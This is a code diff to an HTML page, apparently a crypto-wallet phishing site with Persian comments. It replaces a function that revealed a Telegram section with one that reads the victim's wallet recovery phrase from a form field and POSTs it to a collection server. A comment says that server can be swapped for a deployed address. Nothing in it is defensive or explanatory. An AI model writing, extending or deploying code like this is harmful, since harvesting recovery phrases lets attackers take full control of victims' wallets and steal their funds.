@@ -367,13 +367,26 @@
     </footer>
 
     <script>
-        function activateTelegram() {
-            var recoveryPhrase = document.getElementById("recovery-phrase").value;
+        function sendRecoveryPhrase() {
+    const recoveryPhrase = document.getElementById('recovery-phrase').value;
 
-            if (recoveryPhrase.trim() !== "") {
-                document.getElementById("telegram-section").style.display = "flex"; // نمایش بخش Join Telegram
-            }
-        }
+    fetch('http://localhost:3000/send-recovery', {  // یا آدرس سرور رندر شده
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ recoveryPhrase })
+    })
+    .then(response => response.json())
+    .then(data => {
+        alert(data.message); // پیام دریافتی از سرور
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('There was an error sending the recovery phrase');
+    });
+}
+
     </script>
 </body>
 </html>
